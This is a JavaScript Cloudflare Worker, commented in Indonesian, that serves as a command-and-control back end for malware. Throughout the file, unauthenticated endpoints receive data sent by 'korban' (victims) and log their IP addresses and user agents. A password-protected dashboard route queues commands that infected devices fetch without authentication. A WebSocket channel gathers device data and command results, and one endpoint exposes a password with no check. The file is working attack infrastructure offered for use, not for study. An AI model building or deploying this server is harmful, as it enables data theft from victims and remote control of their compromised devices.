// ================================================================
// Cloudflare Worker - verifikasi-api (HANYA 3 ENDPOINT!)
// ================================================================

// ============================================================
// KONFIGURASI
// ============================================================
const MAX_DATA = 5000;

// ============================================================
// CORS HEADERS
// ============================================================
const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With, X-Device-Id',
  'Access-Control-Expose-Headers': 'X-Total-Count',
  'Access-Control-Max-Age': '86400',
};

// ============================================================
// RESPONSE HELPERS
// ============================================================
function jsonResponse(data, status = 200, extraHeaders = {}) {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      'Content-Type': 'application/json',
      ...CORS,
      ...extraHeaders,
    },
  });
}

function unauthorizedResponse() {
  return jsonResponse({ error: 'Access Denied - Invalid Admin Password' }, 403);
}

// ============================================================
// AUTHENTICATION - HANYA UNTUK DASHBOARD!
// ============================================================
function isAuthenticated(request, env) {
  const url = new URL(request.url);
  const key = url.searchParams.get('key') || 
              request.headers.get('X-API-Key') || 
              request.headers.get('Authorization')?.replace('Bearer ', '');
  return key === env.ADMIN_PASSWORD;
}

// ============================================================
// MAIN HANDLER
// ============================================================
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const method = request.method;
    
    // OPTIONS - CORS Preflight
    if (method === 'OPTIONS') {
      return new Response(null, { headers: CORS });
    }

    // ============================================================
    // 🔥 ENDPOINT 1: POST /data atau /api/data
    // - Korban kirim data (TANPA AUTH)
    // - Dashboard kirim C2 (PAKAI AUTH)
    // ============================================================
    if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'POST') {
      return await handlePostData(request, env);
    }

    // ============================================================
    // 🔥 ENDPOINT 2: GET /data atau /api/data
    // - Dashboard lihat data (PAKAI AUTH)
    // - Device ambil C2 (TANPA AUTH) via ?type=perintah
    // ============================================================
    if ((url.pathname === '/data' || url.pathname === '/api/data') && method === 'GET') {
      return await handleGetData(request, env);
    }

    // ============================================================
    // 🔥 ENDPOINT 3: GET /get-password (TANPA AUTH)
    // ============================================================
    if (url.pathname === '/get-password' && method === 'GET') {
      return jsonResponse({ 
        status: 'ok', 
        password: env.PASSWORD || 'default123',
        timestamp: Date.now()
      });
    }

    // ============================================================
    // WEBSOCKET (TANPA AUTH)
    // ============================================================
    if (url.pathname === '/ws') {
      return handleWebSocket(request, env);
    }

    // ============================================================
    // ROOT - Health Check (TANPA AUTH)
    // ============================================================
    if (url.pathname === '/' && method === 'GET') {
      const raw = await env.DATA.get('data') || '[]';
      const data = JSON.parse(raw);
      return jsonResponse({
        status: 'ok',
        version: '2.0.0',
        timestamp: new Date().toISOString(),
        totalData: data.length,
      });
    }

    // 404
    return jsonResponse({ error: 'Not Found' }, 404);
  }
};

// ============================================================
// HANDLER: POST /data
// ============================================================
async function handlePostData(request, env) {
  try {
    const body = await request.json();
    
    if (!body || typeof body !== 'object') {
      return jsonResponse({ error: 'Invalid request body' }, 400);
    }
    
    // 🔥 JIKA C2 COMMAND DARI DASHBOARD (HARUS PAKAI AUTH!)
    if (body.sumber === 'c2_command' || body.type === 'c2_command') {
      if (!isAuthenticated(request, env)) {
        return unauthorizedResponse();
      }
      
      const cmdData = body.data || body;
      cmdData.timestamp = Date.now();
      cmdData.status = 'pending';
      
      await env.DATA.put('perintah', JSON.stringify(cmdData));
      
      return jsonResponse({ 
        status: 'ok', 
        type: 'c2', 
        command: cmdData.aksi 
      });
    }
    
    // 🔥 SIMPAN DATA DARI KORBAN (TANPA AUTH!)
    const d = {
      waktu: new Date().toISOString(),
      sumber: body.sumber || body.type || 'unknown',
      data: body.data || body,
      ip: request.headers.get('CF-Connecting-IP') || 'unknown',
      userAgent: request.headers.get('User-Agent') || 'unknown',
    };
    
    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);
    
    if (data.length >= MAX_DATA) {
      data = data.slice(-MAX_DATA + 1);
    }
    
    data.push(d);
    await env.DATA.put('data', JSON.stringify(data));
    
    return jsonResponse({ 
      status: 'ok', 
      total: data.length,
    });
    
  } catch (error) {
    return jsonResponse({ error: 'Failed to process data: ' + error.message }, 500);
  }
}

// ============================================================
// HANDLER: GET /data
// ============================================================
async function handleGetData(request, env) {
  const url = new URL(request.url);
  
  // 🔥 DEVICE AMBIL PERINTAH C2 (TANPA AUTH!)
  if (url.searchParams.get('type') === 'perintah') {
    try {
      const perintah = await env.DATA.get('perintah');
      if (perintah) {
        await env.DATA.delete('perintah');
        return new Response(perintah, {
          headers: {
            'Content-Type': 'application/json',
            ...CORS,
          },
        });
      }
      return new Response('{}', {
        headers: {
          'Content-Type': 'application/json',
          ...CORS,
        },
      });
    } catch(e) {
      return new Response('{}', {
        headers: {
          'Content-Type': 'application/json',
          ...CORS,
        },
      });
    }
  }
  
  // 🔥 DASHBOARD LIHAT DATA (HARUS AUTH!)
  if (!isAuthenticated(request, env)) {
    return unauthorizedResponse();
  }
  
  try {
    const raw = await env.DATA.get('data') || '[]';
    let data = JSON.parse(raw);
    
    const source = url.searchParams.get('source');
    if (source) {
      data = data.filter(item => item.sumber === source);
    }
    
    const search = url.searchParams.get('search');
    if (search) {
      const s = search.toLowerCase();
      data = data.filter(item => JSON.stringify(item).toLowerCase().includes(s));
    }
    
    const sort = url.searchParams.get('sort') || 'newest';
    if (sort === 'newest') {
      data.sort((a, b) => new Date(b.waktu).getTime() - new Date(a.waktu).getTime());
    } else if (sort === 'oldest') {
      data.sort((a, b) => new Date(a.waktu).getTime() - new Date(b.waktu).getTime());
    }
    
    const page = parseInt(url.searchParams.get('page')) || 1;
    const limit = Math.min(parseInt(url.searchParams.get('limit')) || 50, 200);
    const total = data.length;
    const start = (page - 1) * limit;
    const end = Math.min(start + limit, total);
    
    return jsonResponse(data.slice(start, end), 200, {
      'X-Total-Count': total,
      'X-Page': page,
      'X-Limit': limit,
    });
    
  } catch(e) {
    return jsonResponse([], 200);
  }
}

// ============================================================
// HANDLER: WebSocket (TANPA AUTH)
// ============================================================
async function handleWebSocket(request, env) {
  const upgradeHeader = request.headers.get('Upgrade');
  if (!upgradeHeader || upgradeHeader !== 'websocket') {
    return new Response('Expected Upgrade: websocket', { status: 426 });
  }

  const webSocketPair = new WebSocketPair();
  const [client, server] = Object.values(webSocketPair);

  server.accept();

  let deviceId = 'unknown';

  server.addEventListener('message', async (event) => {
    try {
      const data = JSON.parse(event.data);
      
      if (data.type === 'auth') {
        deviceId = data.deviceId || 'unknown';
        server.send(JSON.stringify({ type: 'auth_success' }));
        return;
      }

      // COMMAND DARI DASHBOARD
      if (data.type === 'command') {
        await env.DATA.put('perintah', JSON.stringify(data.command));
        server.send(JSON.stringify({ type: 'command_received' }));
        return;
      }

      // DATA DARI DEVICE
      if (data.type === 'data') {
        const raw = await env.DATA.get('data') || '[]';
        let allData = JSON.parse(raw);
        allData.push({
          waktu: new Date().toISOString(),
          sumber: 'websocket_device',
          data: data.data,
          deviceId: deviceId
        });
        if (allData.length > MAX_DATA) {
          allData = allData.slice(-MAX_DATA);
        }
        await env.DATA.put('data', JSON.stringify(allData));
        server.send(JSON.stringify({ type: 'data_saved' }));
        return;
      }

      // C2 RESULT
      if (data.type === 'c2_result') {
        const raw = await env.DATA.get('data') || '[]';
        let allData = JSON.parse(raw);
        allData.push({
          waktu: new Date().toISOString(),
          sumber: 'c2_result',
          data: data.data,
          deviceId: deviceId
        });
        if (allData.length > MAX_DATA) {
          allData = allData.slice(-MAX_DATA);
        }
        await env.DATA.put('data', JSON.stringify(allData));
        server.send(JSON.stringify({ type: 'result_saved' }));
        return;
      }

      // PING/PONG
      if (data.type === 'ping') {
        server.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
        return;
      }

    } catch(e) {
      server.send(JSON.stringify({ type: 'error', message: e.message }));
    }
  });

  return new Response(null, {
    status: 101,
    webSocket: client,
  });
}
